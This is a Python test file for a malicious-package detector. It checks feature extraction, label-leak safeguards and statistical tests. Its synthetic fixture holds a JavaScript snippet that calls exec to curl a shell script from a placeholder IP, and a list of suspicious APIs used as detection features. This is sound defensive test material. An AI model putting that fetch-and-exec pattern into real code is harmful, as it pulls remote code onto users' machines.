"""Round-15 tests for the MalGuard-style feature baseline (AMENDMENT-8).

Locks, BEFORE/ALONGSIDE the real run:
  * the frozen 41-feature list (exact equality + disjointness from the 18
    graph features),
  * extraction determinism (same inputs -> identical features, across calls
    and across KB instances),
  * NO-LABEL-LEAK: extract_sample_features takes no label argument and two
    graph dicts differing ONLY in injected label-ish fields produce identical
    features; the real-corpus feature table is label-blind by construction
    (graphs_v2 rows carry no labels),
  * block design matrices + the registered comparisons machinery (TOST /
    Wilcoxon exact / Holm / McNemar rule) on known outcomes,
  * a tiny run_cell smoke (both methods, deterministic F1).

All fixtures here are SYNTHETIC unit fixtures; the real 603-sample run
happens only through packguard.malguard_style.run_grid with mock=false.
"""
from __future__ import annotations

import json
import math

import numpy as np
import pytest

from packguard import malguard_style as mg
from packguard.features import FEATURE_NAMES as GRAPH_NAMES


# ---------------------------------------------------------------------------
# Frozen list + selections (A8.1 / A8.2)
# ---------------------------------------------------------------------------
def test_frozen_feature_list_exact():
    expected_first = (
        "ratio_file_io_of_api", "ratio_network_of_api", "ratio_process_of_api",
        "ratio_crypto_of_api", "ratio_dynamic_code_of_api",
        "ratio_data_access_of_api", "kb_high_api_ratio", "kb_conf_mean",
    )
    assert mg.MALGUARD_FEATURE_NAMES[:8] == expected_first
    assert len(mg.MALGUARD_FEATURE_NAMES) == 41
    assert len(mg.TOP10_APIS) == 10 and len(set(mg.TOP10_APIS)) == 10
    assert len(mg.TOP10_PAIRS) == 10 and len(set(mg.TOP10_PAIRS)) == 10
    # exact registered selections (AMENDMENT-8 A8.1)
    assert mg.TOP10_APIS == (
        "child_process.exec", "eval", "os.system", "subprocess.Popen",
        "subprocess.run", "require", "child_process", "exec", "os.environ",
        "https.request")
    assert ("DYNAMIC_CODE", "PROCESS") == mg.TOP10_PAIRS[0]
    assert ("FILE_IO", "NETWORK") == mg.TOP10_PAIRS[-1]


def test_disjoint_from_graph_block():
    g = set(GRAPH_NAMES)
    assert len(g) == 18
    m = set(mg.MALGUARD_FEATURE_NAMES)
    assert not (g & m), f"overlap: {g & m}"
    assert len(g | m) == 59  # combined input_dim


def test_names_are_code_valid_and_unique():
    assert len(set(mg.MALGUARD_FEATURE_NAMES)) == 41
    for n in mg.MALGUARD_FEATURE_NAMES:
        assert isinstance(n, str) and n and " " not in n


# ---------------------------------------------------------------------------
# Synthetic graph/text fixtures + determinism + no-label-leak
# ---------------------------------------------------------------------------
def _synth_graph() -> dict:
    return {
        "sample_id": "synth-1",
        "n_nodes": 5,
        "nodes": [
            {"id": 0, "cls": "PROCESS", "api": "child_process.exec"},
            {"id": 1, "cls": "DYNAMIC_CODE", "api": "eval"},
            {"id": 2, "cls": "FILE_IO", "api": "fs.readFileSync"},
            {"id": 3, "cls": "NETWORK", "api": "https.request"},
            {"id": 4, "cls": "DATA_ACCESS", "api": "os.environ"},
        ],
        "files": [
            {"file": "tmp/abc123/pkg/package/postinstall.js",
             "entry_kind": "postinstall", "n_nodes": 2},
            {"file": "tmp/abc123/pkg/lib/index.js",
             "entry_kind": "lib", "n_nodes": 3},
        ],
    }


_SYNTH_TEXT = (
    "const { exec } = require('child_process');\n"
    "const url = 'http://203.0.113.9/x.sh';\n"
    "exec('curl -s ' + url);\n"
    "const blob = 'YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=';  # base64-ish\n"
)


def test_extraction_deterministic_and_complete():
    from packguard.kb import KnowledgeBase

    kb = KnowledgeBase(mg.KB_DIR)
    g, t = _synth_graph(), _SYNTH_TEXT
    f1 = mg.extract_sample_features(g, t, kb)
    f2 = mg.extract_sample_features(g, t, kb)
    assert f1 == f2
    kb2 = KnowledgeBase(mg.KB_DIR)  # fresh instance, same KB state
    assert mg.extract_sample_features(g, t, kb2) == f1
    assert set(f1) == set(mg.MALGUARD_FEATURE_NAMES)
    assert all(isinstance(v, float) and math.isfinite(v) for v in f1.values())
    # spot checks against the A8.2 formulas
    assert f1["ind_api_child_process__exec"] == 1.0
    assert f1["ind_api_eval"] == 1.0
    assert f1["ind_api_os__environ"] == 1.0  # present in the synthetic set
    assert f1["ind_api_subprocess.run".replace(".", "__")] == 0.0  # absent
    assert f1["pair_DYNAMIC_CODE__PROCESS"] == 1.0
    assert f1["pair_CRYPTO__DYNAMIC_CODE"] == 0.0
    assert f1["entry_api_count"] == 2.0
    assert f1["entry_api_share"] == round(2.0 / (5.0 + 1.0), 6)
    assert f1["n_dirs"] == 2.0  # pkg/package + pkg/lib (tmp prefix stripped)
    assert f1["text_url_ip_literal_count"] == 2.0  # http:// + 203.0.113.9
    assert f1["text_eval_exec_count"] >= 1.0
    assert f1["text_shell_indicator_count"] >= 1.0  # curl
    assert f1["text_base64_like_count"] >= 1.0


def test_no_label_leak_label_fields_ignored():
    """Two graph dicts differing ONLY in injected label-ish fields must give
    identical features; the extractor signature must not accept a label."""
    import inspect

    sig = inspect.signature(mg.extract_sample_features)
    assert "label" not in sig.parameters
    assert "y" not in sig.parameters
    from packguard.kb import KnowledgeBase

    kb = KnowledgeBase(mg.KB_DIR)
    g1, g2 = _synth_graph(), _synth_graph()
    g2["label"] = 1
    g2["malicious"] = True
    g2["label_source"] = "adversarial-injection"
    assert mg.extract_sample_features(g1, _SYNTH_TEXT, kb) == \
        mg.extract_sample_features(g2, _SYNTH_TEXT, kb)


def test_empty_inputs_follow_formulas():
    from packguard.kb import KnowledgeBase

    kb = KnowledgeBase(mg.KB_DIR)
    f = mg.extract_sample_features({"nodes": [], "files": [], "n_nodes": 0},
                                   "", kb)
    assert all(v == 0.0 for k, v in f.items() if k != "n_dirs")
    assert f["n_dirs"] == 0.0  # no parsed files -> no parents
    # a parsed but call-free file still yields >= 1 dir (formula-implied,
    # clarified in AMENDMENT-8 A8.2)
    f2 = mg.extract_sample_features(
        {"nodes": [], "files": [{"file": "tmp/x/p/lib/index.js",
                                 "entry_kind": "lib", "n_nodes": 0}],
         "n_nodes": 0}, "", kb)
    assert f2["n_dirs"] == 1.0


def test_real_corpus_table_deterministic(tmp_path):
    """Full real-corpus extraction twice -> byte-identical JSONL (labels are
    never read: graphs_v2 rows carry none)."""
    tab1 = mg.build_feature_table()
    tab2 = mg.build_feature_table()
    assert tab1.keys() == tab2.keys()
    assert tab1 == tab2
    assert len(tab1) == 603
    s = json.dumps(tab1, sort_keys=True)
    assert "label" not in s and '"malicious"' not in s


# ---------------------------------------------------------------------------
# Design matrices + cell smoke
# ---------------------------------------------------------------------------
def _synth_records(n=40, seed=0):
    rng = np.random.default_rng(seed)
    names = sorted(GRAPH_NAMES)
    recs = []
    for i in range(n):
        eco = "npm" if i % 2 == 0 else "pypi"
        label = int(rng.random() < 0.5)
        gfeat = {nm: float(rng.integers(0, 4)) for nm in names}
        recs.append({"sample_id": f"synth-{i:03d}", "ecosystem": eco,
                     "label": label, "package": f"pkg-{i}",  # unique pkg/sample
                     "features": {"graph": gfeat}})
    return recs


def _synth_table(records):
    names = list(mg.MALGUARD_FEATURE_NAMES)
    rng = np.random.default_rng(7)
    return {r["sample_id"]: {nm: float(rng.integers(0, 3)) for nm in names}
            for r in records}


def test_design_matrix_blocks_and_errors():
    recs = _synth_records(12)
    tab = _synth_table(recs)
    Xm = mg.design_matrix(recs, "malguard", tab)
    Xc = mg.design_matrix(recs, "combined", tab)
    Xg = mg.design_matrix(recs, "graph", tab)
    assert Xm.shape == (12, 41) and Xg.shape == (12, 18)
    assert Xc.shape == (12, 59)
    assert np.array_equal(Xc[:, :18], Xg)
    assert np.array_equal(Xc[:, 18:], Xm)
    with pytest.raises(ValueError):
        mg.design_matrix(recs, "nope", tab)
    with pytest.raises(ValueError):
        mg.design_matrix(recs, "hashing_tfidf", tab)  # needs precomputed


def test_run_cell_deterministic_smoke():
    recs = _synth_records(40)
    tab = _synth_table(recs)
    from packguard.fl import make_group_split

    train, test = make_group_split(recs, 0.25, seed=20260922)
    c1 = mg.run_cell(train, test, "malguard", seed=20260922, split="group",
                     malguard_table=tab)
    c2 = mg.run_cell(train, test, "malguard", seed=20260922, split="group",
                     malguard_table=tab)
    assert c1["C_selected"] == c2["C_selected"]
    for method in mg.METHODS:
        m1 = c1["methods"][method]["final_metrics"]
        m2 = c2["methods"][method]["final_metrics"]
        assert m1["f1"] == m2["f1"] and m1["auc"] == m2["auc"]
        assert c1["methods"][method]["probs"] == c2["methods"][method]["probs"]
    assert set(c1["methods"]) == {"strong_centralized", "fedavg"}
    assert c1["input_dim"] == 41
    assert 0.0 <= c1["methods"]["fedavg"]["final_metrics"]["f1"] <= 1.0


def test_combined_dim_on_real_names():
    assert 18 + 41 == 59


# ---------------------------------------------------------------------------
# Registered stats rules (A8.4) on known outcomes
# ---------------------------------------------------------------------------
def test_tost_known_outcomes():
    rng = np.random.default_rng(0)
    inside = list(rng.normal(0.0, 0.005, size=20))
    t = mg.tost(inside, margin=0.02)
    assert t["equivalent"] is True
    assert t["ci_low"] > -0.02 and t["ci_high"] < 0.02
    below = [d - 0.05 for d in inside]  # whole distribution below -margin
    t2 = mg.tost(below, margin=0.02)
    assert t2["equivalent"] is False and t2["ci_high"] <= -0.02
    assert mg.tost([0.0] * 20, margin=0.02)["equivalent"] is True


def test_wilcoxon_and_holm_known():
    w = mg.wilcoxon_exact([0.01] * 15 + [-0.01] * 5)
    assert w["p_value_exact"] is not None and w["n_pos"] == 15
    assert mg.wilcoxon_exact([0.0, 0.0])["p_value_exact"] is None
    adj = mg.holm([0.01, 0.02, 0.03, 0.04])
    assert adj == sorted(adj)
    assert all(a >= p for a, p in zip(adj, [0.01, 0.02, 0.03, 0.04]))


def test_mcnemar_rule_exact_threshold():
    # 10 discordant pairs (< 25) -> exact binomial
    y = [1] * 50
    pa = [0.9] * 40 + [0.1] * 10
    pb = [0.9] * 40 + [0.1] * 5 + [0.9] * 5  # 5 a-fail/b-success, 0 reverse
    from packguard.fl import paired_correctness

    corr_a, corr_b = paired_correctness(pa, pb, y)
    mc = mg.mcnemar_exact_or_cc(corr_a, corr_b)
    assert mc["exact"] is True and mc["b01_a_fail_b_success"] == 5
    assert mc["b10_a_success_b_fail"] == 0
    # 70 samples, 30 discordant (>= 25) -> continuity-corrected chi2
    y2 = [1] * 70
    pa2 = [0.9] * 40 + [0.1] * 30
    pb2 = [0.9] * 40 + [0.1] * 5 + [0.9] * 25
    ca, cb = paired_correctness(pa2, pb2, y2)
    mc2 = mg.mcnemar_exact_or_cc(ca, cb)
    assert mc2["exact"] is False
    assert mc2["b01_a_fail_b_success"] == 25
    assert mc2["b10_a_success_b_fail"] == 0


def test_per_ecosystem_f1_splits():
    y = [1, 0, 1, 0]
    eco = ["npm", "npm", "pypi", "pypi"]
    probs = [0.9, 0.1, 0.2, 0.8]
    out = mg.per_ecosystem_f1(eco, y, probs)
    assert set(out) == {"eco_npm", "eco_pypi"}
    assert out["eco_npm"] == 1.0 and out["eco_pypi"] == 0.0
